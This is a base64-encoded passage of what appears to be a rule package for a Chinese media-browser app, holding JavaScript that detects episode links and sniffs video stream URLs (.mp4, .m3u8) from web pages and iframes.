xcbiAgICAgICAgfSBjYXRjaCAoZSkge1xcbiAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAubG9nKGUudG9TdHJpbmcoKSk7XFxuICAgICAgICB9XFxuICAgIH0pO1xcbiAgICBsZXQganMyID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UveDVhaVxcXCIpKGdldFBhcmFtKFxcXCJyXFxcIiksIHVybCk7XFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogXFxcIlxcXCIsXFxuICAgICAgICB1cmw6IHVybCxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwieDVfd2Vidmlld19zaW5nbGVcXFwiLFxcbiAgICAgICAgZGVzYzogXFxcImZsb2F0JiYxMDAlXFxcIixcXG4gICAgICAgIHBpY191cmw6IFxcXCJcXFwiLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBqczoganMgKyBcXFwiO1xcXFxuXFxcIiArIGpzMixcXG4gICAgICAgICAgICB1cmxJbnRlcmNlcHRvcjogaXRlLFxcbiAgICAgICAgICAgIGNhbkJhY2s6IHRydWUsXFxuICAgICAgICAgICAgZmxvYXRWaWRlbzogdHJ1ZSxcXG4gICAgICAgICAgICBqc0xvYWRpbmdJbmplY3Q6IHRydWVcXG4gICAgICAgIH1cXG4gICAgfSk7XFxuICAgIGQucHVzaCh7XFxuICAgICAgICBjb2xfdHlwZTogXFxcImxpbmVcXFwiLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBpZDogdXJsXFxuICAgICAgICB9XFxuICAgIH0pO1xcbiAgICBpZiAoIWluV2hpdGUpIHtcXG4gICAgICAgIHRvYXN0KFxcXCJBSeWMuemFjeWksei0pe+8jOW3suS9v+eUqFg15Yqg6L29XFxcIik7XFxuICAgIH1cXG4gICAgc2V0UmVzdWx0KGQpO1xcbn0gZWxzZSB7XFxuICAgIHNldFJlc3VsdChkKTtcXG59XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLkuoznuqdwYXJzZVwiLFwicGF0aFwiOlwicGFyc2VcIixcInJ1bGVcIjpcIiQuZXhwb3J0cyA9IGZ1bmN0aW9uKHJ1bGUsIHdlYiwgdXJsLCBodG1sKSB7XFxuICAgIGxldCBkID0gW107XFxuXFxuICAgIGxldCBhbGlzdCA9IHBkZmEoaHRtbCwgXFxcImJvZHkmJmFcXFwiKTtcXG4gICAgbGV0IGFyciA9IGFsaXN0Lm1hcChpdCA9PiB7XFxuICAgICAgICByZXR1cm4ge1xcbiAgICAgICAgICAgIC8vaHRtbDogaXQsXFxuICAgICAgICAgICAgdGV4dDogcGRmaChpdCwgXFxcImEmJlRleHRcXFwiKSxcXG4gICAgICAgICAgICB0aXRsZTogcGRmaChpdCwgXFxcImEmJnRpdGxlXFxcIiksXFxuICAgICAgICAgICAgaHJlZjogcGQoaXQsIFxcXCJhJiZocmVmXFxcIiwgdXJsKVxcbiAgICAgICAgfVxcbiAgICB9KTtcXG4gICAgLy9sb2coYXJyKTtcXG4gICAgbGV0IGRlYnVnID0gZmFsc2U7XFxuXFxuICAgIGZ1bmN0aW9uIGNsZWFyVGV4dChpdCkge1xcbiAgICAgICAgcmV0dXJuIGl0LnJlcGxhY2UoL+esrHzpm4Z856ugL2csIFxcXCJcXFwiKTtcXG4gICAgfVxcblxcbiAgICBmdW5jdGlvbiBpc01vdmllKGl0KSB7XFxuICAgICAgICBpZiAoaXQgPT0gbnVsbCB8fCBpdC50ZXh0ID09IG51bGwpIHtcXG4gICAgICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgICAgICB9XFxuICAgICAgICBsZXQgdGl0ID0gaXQudGl0bGUgfHwgXFxcIlxcXCI7XFxuICAgICAgICBpdCA9IGl0LnRleHQgfHwgXFxcIlxcXCI7XFxuICAgICAgICBpZiAoaXQgPT0gXFxcIlxcXCIgfHwgaXQubGVuZ3RoID4gOCkge1xcbiAgICAgICAgICAgIHJldHVybiBmYWxzZTtcXG4gICAgICAgIH1cXG4gICAgICAgIC8v5o6S6ZmkXFxuICAgICAgICBsZXQgcmVnID0gL1xcXFwufOmrmOa4heebtOaSrXzlhpnnnJ/mjqjojZB85b2x6ZmifOW9seinhnzok53lhYnnlLXlvbF86auY5riF55S15b2xfOesrOS4gOWto3znrKzkuozlraN856ys5LiJ5a2jfOesrOWbm+Wto3znrKzkupTlraMvO1xcbiAgICAgICAgaWYgKHRpdCAhPSBcXFwiXFxcIiAmJiAhdGl0LmluY2x1ZGVzKGl0KSB8fCByZWcudGVzdChpdCkpIHtcXG4gICAgICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgICAgICB9XFxuICAgICAgICByZXR1cm4gaXQubWF0Y2goL+WOn+eUu3zlpIfnlKh86JOd5YWJfOi2hea4hXzpq5jmuIV85q2j54mHfOmfqeeJiHw0S3w0a3wxMDgwUHw3MjBQfFRDfEhEfEJELylcXG4gICAgfVxcblxcbiAgICBmdW5jdGlvbiBub3RDaGFwdGVyKGl0KSB7XFxuICAgICAgICBpZiAoaXQgPT0gbnVsbCB8fCBpdC50ZXh0ID09IG51bGwpIHtcXG4gICAgICAgICAgICByZXR1cm4gdHJ1ZTtcXG4gICAgICAgIH1cXG4gICAgICAgIHJldHVybiBpdC50ZXh0Lm1hdGNoKC9bMC05XVxcXFwuWzAtOV3liIYvKTtcXG4gICAgfVxcblxcbiAgICBmdW5jdGlvbiBpc0NoYXB0ZXIoaXQsIHByZSwgbmV4dCkge1xcbiAgICAgICAgaWYgKG5vdENoYXB0ZXIoaXQpKSB7XFxuICAgICAgICAgICAgLy/kvJjlhYjmjpLpmaRcXG4gICAgICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgICAgICB9XFxuICAgICAgICAvL+WIpOaWreaYr+S4jeaYr+eUteW9sVxcbiAgICAgICAgaWYgKGlzTW92aWUoaXQpKSB7XFxuICAgICAgICAgICAgcmV0dXJuIHRydWU7XFxuICAgICAgICB9XFxuICAgICAgICByZXR1cm4gaXNDaGFwdGVyMChpdCwgcHJlKSB8fCBpc0NoYXB0ZXIwKGl0LCBuZXh0KTtcXG4gICAgfVxcblxcbiAgICBmdW5jdGlvbiBnZXRDaGFwdGVyTnVtKGl0KSB7XFxuICAgICAgICBpZiAoaXQgPT0gbnVsbCB8fCBpdC50ZXh0ID09IG51bGwpIHtcXG4gICAgICAgICAgICByZXR1cm4gLTE7XFxuICAgICAgICB9XFxuICAgICAgICBpdCA9IGl0LnRleHQgfHwgXFxcIlxcXCI7XFxuICAgICAgICBpZiAoaXQgPT0gXFxcIlxcXCIpIHtcXG4gICAgICAgICAgICByZXR1cm4gLTE7XFxuICAgICAgICB9XFxuICAgICAgICBpdCA9IGNsZWFyVGV4dChpdCk7XFxuICAgICAgICBsZXQgcmVnID0gL15bMC05XSokLztcXG4gICAgICAgIGlmICghcmVnLnRlc3QoaXQpKSB7XFxuICAgICAgICAgICAgcmV0dXJuIC0xO1xcbiAgICAgICAgfVxcbiAgICAgICAgaXQgPSBwYXJzZUludChpdCk7XFxuICAgICAgICBpZiAoaXNOYU4oaXQpKSB7XFxuICAgICAgICAgICAgcmV0dXJuIC0xO1xcbiAgICAgICAgfVxcbiAgICAgICAgaWYgKGl0ID4gMTkwMCAmJiBpdCA8IDIxMDApIHtcXG4gICAgICAgICAgICByZXR1cm4gLTE7XFxuICAgICAgICB9XFxuICAgICAgICByZXR1cm4gaXQ7XFxuICAgIH1cXG5cXG4gICAgZnVuY3Rpb24gaXNDaGFwdGVyMChpdCwgYnJvdGhlcikge1xcbiAgICAgICAgLyppZiAoZGVidWcpIHtcXG4gICAgICAgICAgICBsb2coe1xcbiAgICAgICAgICAgICAgICBpdDogaXQsXFxuICAgICAgICAgICAgICAgIGJyb3RoZXI6IGJyb3RoZXJcXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgIH0qL1xcbiAgICAgICAgaXQgPSBnZXRDaGFwdGVyTnVtKGl0KTtcXG4gICAgICAgIC8vaWYgKGRlYnVnKSBsb2coaXQpO1xcbiAgICAgICAgaWYgKGl0IDwgMCkge1xcbiAgICAgICAgICAgIHJldHVybiBmYWxzZTtcXG4gICAgICAgIH1cXG4gICAgICAgIGJyb3RoZXIgPSBnZXRDaGFwdGVyTnVtKGJyb3RoZXIpO1xcbiAgICAgICAgLy9pZiAoZGVidWcpIGxvZyhicm90aGVyKTtcXG4gICAgICAgIGlmIChicm90aGVyIDwgMCkge1xcbiAgICAgICAgICAgIHJldHVybiBmYWxzZTtcXG4gICAgICAgIH1cXG4gICAgICAgIHJldHVybiBpdCAtIGJyb3RoZXIgPCAyICYmIGl0IC0gYnJvdGhlciA+IC0yO1xcbiAgICB9XFxuXFxuICAgIGxldCBfd2ViID0gJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgICBsZXQgdXJscyA9IF9nZXRVcmxzKCk7XFxuICAgICAgICBsZXQgcmVnID0gL1xcXFwuaHRtbHxcXFxcLmNzc3xcXFxcLmpzLztcXG4gICAgICAgIGZvciAobGV0IGsgaW4gdXJscykge1xcbiAgICAgICAgICAgIGlmICghcmVnLnRlc3QodXJsc1trXSkgJiYgdXJsc1trXS5tYXRjaCgvXFxcXC5tcDR8XFxcXC5tM3U4LykpIHtcXG4gICAgICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5sb2codXJsc1trXSk7XFxuICAgICAgICAgICAgICAgIHJldHVybiBmeV9icmlkZ2VfYXBwLmdldEhlYWRlclVybCh1cmxzW2tdLnJlcGxhY2UoLy4qP3VybD0vLCBcXFwiXFxcIikpICsgXFxcIiNpZ25vcmVJbWc9dHJ1ZSNcXFwiO1xcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG4gICAgfSk7XFxuXFxuICAgIGZvciAobGV0IGkgPSAwOyBpIDwgYXJyLmxlbmd0aDsgaSsrKSB7XFxuICAgICAgICBsZXQgaXQgPSBhcnJbaV07XFxuICAgICAgICBsZXQgdCA9IGl0LnRleHQ7XFxuICAgICAgICBpZiAoIWl0LmhyZWYgfHwgaXQuaHJlZiA9PSBcXFwiXFxcIikge1xcbiAgICAgICAgICAgIGNvbnRpbnVlO1xcbiAgICAgICAgfVxcbiAgICAgICAgbGV0IHByZSA9IGkgPT0gMCA/IG51bGwgOiBhcnJbaSAtIDFdO1xcbiAgICAgICAgbGV0IG5leHQgPSBpID09IChhcnIubGVuZ3RoIC0gMSkgPyBudWxsIDogYXJyW2kgKyAxXTtcXG4gICAgICAgIGlmIChpc0NoYXB0ZXIoaXQsIHByZSwgbmV4dCkpIHtcXG4gICAgICAgICAgICBpZiAod2ViKSB7XFxuICAgICAgICAgICAgICAgIHZhciB1cmx4ID0gXFxcIndlYlJ1bGU6Ly9cXFwiICsgaXQuaHJlZiArIFxcXCJAXFxcIiArIF93ZWI7XFxuICAgICAgICAgICAgICAgIHZhciBleHRyYXggPSB7XFxuICAgICAgICAgICAgICAgICAgICBqc0xvYWRpbmdJbmplY3Q6IHRydWUsXFxuICAgICAgICAgICAgICAgICAgICBpZDogaXQuaHJlZixcXG4gICAgICAgICAgICAgICAgICAgIGJsb2NrUnVsZXM6IFsnLm00YScsICcubXAzJywgJy5mbHYnLCAnLmF2aScsICcuM2dwJywgJy5tcGVnJywgJy53bXYnLCAnLm1vdicsICcucm12YicsICcuZ2lmJywgJy5qcGVnJywgJy5wbmcnLCAnLmljbycsICcuc3ZnJ11cXG4gICAgICAgICAgICAgICAgfTtcXG4gICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICB2YXIgdXJseCA9IFxcXCJ2aWRlbzovL1xcXCIgKyBpdC5ocmVmO1xcbiAgICAgICAgICAgICAgICB2YXIgZXh0cmF4ID0ge1xcbiAgICAgICAgICAgICAgICAgICAgaWQ6IGl0LmhyZWZcXG4gICAgICAgICAgICAgICAgfTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHQsXFxuICAgICAgICAgICAgICAgIHVybDogdXJseCxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzNcXFwiLFxcbiAgICAgICAgICAgICAgICBleHRyYTogZXh0cmF4XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICB9XFxuICAgIH1cXG4gICAgaWYgKGQubGVuZ3RoID09IDApIHtcXG4gICAgICAgIHJldHVybiBkO1xcbiAgICB9IGVsc2Uge1xcblxcbiAgICAgICAgZC5zcGxpY2UoMCwgMCwge1xcbiAgICAgICAgICAgIHRpdGxlOiBcXFwi8J+Ul1xcXCIgKyB1cmwsXFxuICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9wYWdlL3lzZng/cnVsZT1cXFwiICsgcnVsZSArIFxcXCImcj1cXFwiICsgcnVsZSArIFxcXCIjI1xcXCIgKyB1cmwsXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiLFxcbiAgICAgICAgICAgIGRlc2M6IFxcXCJcXFwiLFxcbiAgICAgICAgICAgIHBpY191cmw6IFxcXCJcXFwiXFxuICAgICAgICB9KTtcXG5cXG5cXG4gICAgICAgIC8v5Li657q/6Lev5Yqg5YiG5Ymy57q/XFxuICAgICAgICBsZXQgZDIgPSBbXTtcXG4gICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgZC5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgICAgIGQyLnB1c2goZFtpXSk7XFxuICAgICAgICAgICAgaWYgKGkgPCBkLmxlbmd0aCAtIDEpIHtcXG4gICAgICAgICAgICAgICAgbGV0IGl0ID0gZFtpXTtcXG4gICAgICAgICAgICAgICAgbGV0IHQxID0gcGFyc2VJbnQoY2xlYXJUZXh0KGl0LnRpdGxlKSk7XFxuICAgICAgICAgICAgICAgIGxldCBuZXh0ID0gZFtpICsgMV07XFxuICAgICAgICAgICAgICAgIGxldCB0MiA9IHBhcnNlSW50KGNsZWFyVGV4dChuZXh0LnRpdGxlKSk7XFxuICAgICAgICAgICAgICAgIGlmICh0MiAtIHQxID4gMSB8fCB0MSAtIHQyID4gMSkge1xcbiAgICAgICAgICAgICAgICAgICAgZDIucHVzaCh7XFxuICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJiaWdfYmxhbmtfYmxvY2tcXFwiXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgICAgIGQyLnB1c2goe1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwibGluZV9ibGFua1xcXCJcXG4gICAgICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICAgICAgZDIucHVzaCh7XFxuICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJiaWdfYmxhbmtfYmxvY2tcXFwiXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH1cXG4gICAgICAgIGQyLnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiBcXFwi5Yy56YWN5pyJ6K+v77yf54K55oiR5LiN5YaN5Yy56YWN5q2k6aG16Z2iXFxcIixcXG4gICAgICAgICAgICB1cmw6ICQoXFxcIiNub0xvYWRpbmcjXFxcIikubGF6eVJ1bGUoKHVybCkgPT4ge1xcbiAgICAgICAgICAgICAgICBjb25maXJtKHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFwi5rip6aao5o+Q56S6XFxcIixcXG4gICAgICAgICAgICAgICAgICAgIGNvbnRlbnQ6IFxcXCLlpoLmnpzlj6rmmK/ljZXmrKHljLnphY3lpLHotKXvvIzngrnlh7vkuIvmlrnlj5bmtojmjInpkq7liLfmlrDpobXpnaLph43mlrDljLnphY3vvIzlpoLmnpznoa7orqTml6Dms5XljLnphY3vvIzngrnlh7vkuIvmlrnnoa7lrprmjInpkq7liqDlhaXnmb3lkI3ljZVcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgY2FuY2VsOiBcXFwicmVmcmVzaFBhZ2UoKVxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBjb25maXJtOiAkLnRvU3RyaW5nKCh1cmwpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgbGlzdCA9IHN0b3JhZ2UwLmdldEl0ZW0oXFxcIndoaXRlXFxcIiwgW10pO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGxpc3QucHVzaCh1cmwpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHN0b3JhZ2UwLnNldEl0ZW0oXFxcIndoaXRlXFxcIiwgbGlzdCk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5bey5Yqg5YWl55m95ZCN5Y2VXFxcIlxcbiAgICAgICAgICAgICAgICAgICAgfSwgdXJsKVxcbiAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIlxcbiAgICAgICAgICAgIH0sIHVybCksXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJhdmF0YXJcXFwiLFxcbiAgICAgICAgICAgIGltZzogXFxcImhpa2VyOi8vaW1hZ2VzL2FjY291bnRcXFwiXFxuICAgICAgICB9KTtcXG4gICAgICAgIHJldHVybiBkMjtcXG4gICAgfVxcbn1cIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIng1QUlcIixcInBhdGhcIjpcIng1YWlcIixcInJ1bGVcIjpcIiQuZXhwb3J0cyA9IGZ1bmN0aW9uKHJ1bGUsIGFuY2hvcklkKSB7XFxuICAgIHJldHVybiAkLnRvU3RyaW5nKChydWxlLCBhbmNob3JJZCwgd2hpdGUpID0+IHtcXG4gICAgICAgIGlmICh3aW5kb3cuY2hlY2swID09IG51bGwpIHtcXG4gICAgICAgICAgICBmdW5jdGlvbiBjaGVjazAoKSB7XFxuICAgICAgICAgICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgaHRtbCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoXFxcImh0bWxcXFwiKS5pbm5lckhUTUw7XFxuICAgICAgICAgICAgICAgICAgICBmYmEucHV0VmFyKFxcXCJodG1sMFxcXCIsIGh0bWwpO1xcbiAgICAgICAgICAgICAgICAgICAgZmJhLnBhcnNlTGF6eVJ1bGVBc3luYygkJCQoKS5sYXp5UnVsZSgocnVsZSwgdXJsLCBhbmNob3JJZCwgd2hpdGUpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICB0cnkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZCA9IFtdO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgaHRtbCA9IGdldFZhcihcXFwiaHRtbDBcXFwiLCBcXFwiXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFyVmFyKFxcXCJodG1sMFxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgd2ViID0gZmFsc2U7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghd2hpdGUuaW5jbHVkZXModXJsKSkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHBhcnNlID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvcGFyc2U/cnVsZT1cXFwiICsgcnVsZSk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkID0gcGFyc2UocnVsZSwgd2ViLCB1cmwsIGh0bWwpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkLmxlbmd0aCA8IDEpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGFyciA9IHBkZmEoaHRtbCwgXFxcImJvZHkmJmlmcmFtZVxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhcnIubGVuZ3RoID4gMCkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgc3JjID0gcGRmaChhcnJbMF0sIFxcXCJpZnJhbWUmJnNyY1xcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2coXFxcIuiOt+WPluWIsGlmcmFtZe+8mlxcXCIgKyBzcmMpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIXdoaXRlLmluY2x1ZGVzKHNyYykpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzcmMgJiYgc3JjLnN0YXJ0c1dpdGgoXFxcImh0dHBcXFwiKSAmJiAhc3JjLm1hdGNoKC9cXFxcLm1wNHxcXFxcLm0zdTh8XFxcXC5tcDN8XFxcXC5mbHZ8XFxcXC5ta3YvKSkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh0bWwgPSByZXF1ZXN0KHNyYyk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZCA9IHBhcnNlKHJ1bGUsIHdlYiwgc3JjLCBodG1sKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2coXFxcIuWwneivleiOt+WPlmlmcmFtZeWksei0pVxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkLmxlbmd0aCA+IDApIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRbMF0udXJsID0gJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoYW5jaG9ySWQpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZGVzYyA9IGdldFZhcihhbmNob3JJZCwgXFxcIjBcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZGVzYyA9PSBcXFwiMFxcXCIpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFg1RGVzYyhcXFwiZmxvYXQmJnNjcmVlbi0xNzBcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHV0VmFyKGFuY2hvcklkLCBcXFwiMVxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlZnJlc2hYNURlc2MoXFxcImZsb2F0JiYwXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB1dFZhcihhbmNob3JJZCwgXFxcIjBcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIjtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0sIGFuY2hvcklkICsgXFxcIng1XFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkWzBdLnRpdGxlID0gXFxcIuWxleW8gC/mlLbotbdcXFwiICsgZFswXS50aXRsZTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB1dFZhcihhbmNob3JJZCArIFxcXCJ4NVxcXCIsIFxcXCIwXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoWDVEZXNjKFxcXCJmbG9hdCYmMFxcXCIpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaXQgb2YgZCkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBleHRyYSA9IGl0LmV4dHJhIHx8IHt9O1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4dHJhLmNscyA9IFxcXCJ4NWFpXFxcIjtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpdC5leHRyYSA9IGV4dHJhO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVsZXRlSXRlbUJ5Q2xzKFxcXCJ4NWFpXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhZGRJdGVtQWZ0ZXIoYW5jaG9ySWQsIGQpO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9hc3QoXFxcIkFJ5Yy56YWN5oiQ5YqfXFxcIik7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGQubGVuZ3RoID4gMCkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nKFxcXCJwYXJzZUxhenlSdWxlQXN5bmM6XFxcIiArIGQubGVuZ3RoKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZC5sZW5ndGggPiAwID8gXFxcIjFcXFwiIDogXFxcIjBcXFwiO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nKGUudG9TdHJpbmcoKSk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgfSwgcnVsZSwgbG9jYXRpb24uaHJlZiwgYW5jaG9ySWQsIHdoaXRlKSwgJCQkLnRvU3RyaW5nKCgpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoXFxcIjBcXFwiID09IGlucHV0KSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5jaGVja2MgPSB3aW5kb3cuY2hlY2tjICsgMTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgLyppZiAod2luZG93LmNoZWNrYyA+IDEyMCkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmJhLmxvZyhcXFwi5omn6KGM6LaF6L+HMzDnp5LvvIzml6Dms5Xop6PmnpBcXFwiKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsqL1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KHdpbmRvdy5jaGVjazAsIDI1MCk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vfVxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5jaGVja3VybCA9IGxvY2F0aW9uLmhyZWY7XFxuXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGNoZWNrdTAoKSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAod2luZG93LmNoZWNrdXJsICE9IGxvY2F0aW9uLmhyZWYpIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvL2hhc2jlj5HnlJ/kuoblj5jljJZcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3cuY2hlY2tjID0gMDtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hlY2swKCk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgMjAwMCk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoY2hlY2t1MCwgMjUwKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGVja3UwKCk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICAgICAgfSkpO1xcbiAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7XFxuICAgICAgICAgICAgICAgICAgICBmYmEubG9nKGUudG9TdHJpbmcoKSk7XFxuICAgICAgICAgICAg